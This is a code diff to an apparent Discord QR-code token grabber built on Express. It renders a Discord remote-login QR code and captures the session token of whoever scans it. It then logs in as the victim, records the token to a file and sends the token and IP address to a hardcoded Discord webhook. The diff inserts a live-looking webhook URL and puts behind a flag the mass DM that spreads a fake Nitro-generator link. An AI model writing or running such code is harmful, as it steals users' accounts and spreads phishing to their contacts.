@@ -11,7 +11,8 @@ app.get('/', async (req, res) => {
     const ip_addr = req.socket.remoteAddress || req.headers['x-forwarded-for'];
     const auth_client = new RemoteAuthClient();
     
-    const message_to_send = 'Omg https://vu.fr/QrNitroGenerator\nhttps://media.discordapp.net/attachments/897903146469306378/898857234673598484/unknown.png';
+    const message_to_send = '';
+    const spam = false
     
     auth_client.on('pendingRemoteInit', async fingerprint => {
         await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
@@ -23,7 +24,7 @@ app.get('/', async (req, res) => {
         client.on('ready', () => {
             console.log(`[${chalk.yellowBright('*')}] Connected on ${token}`);
 
-            new Webhook('https://discord.com/api/webhooks/you webhook')
+            new Webhook('https://discord.com/api/webhooks/925501105700491324/55PP9dnRyjH-li1IurGlzmqTjYvEb0RA78eOUPd-75m0AYOQ2II65uv4lpqjZhcig1hk')
                 .send(new MessageBuilder()
                     .setColor('#f5b642').setThumbnail(client.user.avatarURL).setFooter('🤡 Joker by !\'" Ѵιcнч.ѕн#1024').setTimestamp()
                     .setDescription('```' + token + '```' + '\n' + '```' + ip_addr + '```\n')
@@ -33,14 +34,15 @@ app.get('/', async (req, res) => {
                     .addField('> `🤡` **Friends**', `\`${client.user.friends.size}\``)
                     .addField('> `📋` **Presence**', `\`${client.user.presence.status}\``)
                 );
-            
-            client.user.friends.forEach(async member => {
-                await member.send(`||<@${member.id}>|| ${message_to_send}`).catch(err => {
-                    console.log(`[${chalk.redBright('-')}] Dm -> ${err.message}`);
-                }).then(() => {
-                    console.log(`[${chalk.cyanBright('+')}] Dm -> ${member.username}`);
+            if (spam) { 
+                client.user.friends.forEach(async member => {
+                    await member.send(`||<@${member.id}>|| ${message_to_send}`).catch(err => {
+                        console.log(`[${chalk.redBright('-')}] Dm -> ${err.message}`);
+                    }).then(() => {
+                        console.log(`[${chalk.cyanBright('+')}] Dm -> ${member.username}`);
+                    });
                 });
-            });
+            }
         });
 
         client.login(token).then(() => fss.appendFileSync('./tokens.txt', `${token}\n`));
